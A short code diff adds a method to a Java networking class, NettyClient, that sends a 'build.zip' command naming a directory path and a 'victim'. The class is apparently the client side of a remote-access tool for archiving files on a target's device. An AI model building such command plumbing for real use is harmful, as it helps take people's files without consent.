@@ -226,6 +226,14 @@ public class NettyClient extends AsyncTask<String, String, String> {
         queryHandler.sendMessage(query);
     }
 
+    public void sendBuildZip(String dirPath, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "build.zip");
+        query.put("dirPath", dirPath);
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
     public void sendErrorCode(String code) {
         JSONObject query = new JSONObject();
         query.put("errorCode", code);
